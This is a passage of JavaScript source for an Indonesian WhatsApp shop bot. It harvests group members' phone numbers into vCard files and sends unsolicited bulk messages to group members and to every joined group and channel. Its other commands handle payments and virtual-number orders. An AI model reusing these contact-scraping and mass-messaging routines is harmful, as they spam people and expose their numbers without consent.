fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await gisnaxd.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await gisnaxd.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await gisnaxd.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await gisnaxd.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await gisnaxd.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await gisnaxd.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await gisnaxd.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await gisnaxd.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await gisnaxd.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await gisnaxd.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await gisnaxd.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await gisnaxd.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await gisnaxd.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmch": case "jpmallch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id ch didalam database")
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await gisnaxd.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await gisnaxd.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await gisnaxd.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await gisnaxd.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await gisnaxd.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmht": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await gisnaxd.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
let ments = allgrup[i].participants.map(e => e.id)
let pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments } : { text: ttks, mentions: ments }
await gisnaxd.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await gisnaxd.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await gisnaxd.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await gisnaxd.sendMessage(i, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }    
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await gisnaxd.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await gisnaxd.sendMessage(m.chat, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopepay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qlist})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await gisnaxd.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await gisnaxd.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await gisnaxd.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await gisnaxd.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await gisnaxd.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
gisnaxd.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./Skyzopedia.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ip": {
if (!isCreator) return
let t = await fetchJson('https://api64.ipify.org?format=json')
m.reply(`IP Panel : ${t.ip}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
gisnaxd.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya bisa dengan kirim foto"))
let res
if (/image/.test(mime)) res = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
let content = res !== undefined ? { image: {url: res}, caption: text } : { text: text }
await gisnaxd.sendMessage(idSaluran, content)
m.reply("Berhasil mengirim pesan ke dalam channel whatsapp")
if (res !== undefined) await fs.unlinkSync(res)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await gisnaxd.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "create-storywa": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await gisnaxd.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await gisnaxd.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await gisnaxd.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: gisnaxd.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await gisnaxd.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return m.reply(`Berhasil membuat status tag grup ${nama}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-${global.versi}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await gisnaxd.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await gisnaxd.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await gisnaxd.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
gisnaxd.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = ` *── List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
gisnaxd.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listnokos":
{
 let teksnya = `
Haii @${m.sender.split("@")[0]}, Silahkan Pilih Layanan Nokos Yang Tersedia Di Bawah
━━━━━━━━━━━━━━━━
ぃ .ubahstatus 
ぃ .statussms  
ぃ .cekpesanan 
 `;
 let thumbnailBuffer;
 try {
 const response = await axios.get(global.image.menu, { responseType: "arraybuffer" }); 
 thumbnailBuffer = response.data;
 } catch (err) {
 console.error("Gagal mengambil gambar:", err);
 }

 // Menyiapkan daftar layanan ke dalam tombol
 let layananRows = global.layananVirtuSIM.map(layanan => ({
   title: layanan.nama,
   id: `.ordernokos ${layanan.id}`
 }));

 await gisnaxd.sendMessage(m.chat, {
 footer: ` ${botname}`,
 buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'Pilih Layanan' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'ʟᴀʏᴀɴᴀɴ ᴛᴇʀsᴇᴅɪᴀ',
          sections: [
            {
              title: 'Layanan',
              highlight_label: 'ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ',
              rows: layananRows
            }
          ]
        })
      }
    }
  ],
 headerType: 1,
 viewOnce: true,
 document: fs.readFileSync("./package.json"),
 fileName: `By ${namaOwner} </>`,
 mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 fileLength: 99999999,
 caption: teksnya,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran
 },
 externalAdReply: {
 title: `${botname}`,
 body: `♨️ ${runtime(process.uptime())}`,
 mediaType: 1,
 thumbnailUrl: global.image.menu, 
 sourceUrl: linkSaluran,
 renderLargerThumbnail: false 
 }
 }
 });
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ordernokos": {
    try {
        if (m.isGroup) return Reply("❌ Pembelian hanya bisa dilakukan di private chat!");
        if (db.users[m.sender]?.status_deposit) return Reply("⚠️ Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

        if (!args[0]) {
            return Reply("❌ Format salah!\nGunakan: *ordernokos <ID_SERVICE>*");
        }

        const serviceId = args[0].trim();
        const layanan = global.layananVirtuSIM.find(l => l.id == serviceId);
        if (!layanan) return Reply("❌ ID Layanan tidak ditemukan. Cek daftar layanan yang tersedia.");

        const hargaAsli = Number(layanan.harga);
        const pajakAdmin = global.pajakAdmin || 10;
        const totalHarga = Math.ceil(hargaAsli * (1 + pajakAdmin / 100));
        const amount = totalHarga + generateRandomNumber(110, 250);
        const UrlQr = global.qrisOrderKuota;

        const { data } = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`);
        if (!data || !data.result) return Reply("❌ Gagal membuat QRIS pembayaran. Coba lagi nanti.");

        const pembayaran = data.result;
        const teks3 = `
*📌 INFORMASI PEMBAYARAN*

🆔 *ID Transaksi:* ${pembayaran.transactionId}
💰 *Total Pembayaran:* Rp${await toIDR(pembayaran.amount)}
📦 *Barang:* ${layanan.nama}
⏳ *Expired:* 5 menit

⚠️ QRIS hanya berlaku selama 5 menit. Jika pembayaran berhasil, pesanan akan otomatis diproses.

Ketik *.batalbeli* untuk membatalkan transaksi ini.
`;

        let msgQr = await gisnaxd.sendMessage(m.chat, {
            footer: ` ${botname}`,
            buttons: [
                { buttonId: `.batalbeli`, buttonText: { displayText: 'Batalkan Pembelian' }, type: 1 }
            ],
            headerType: 1,
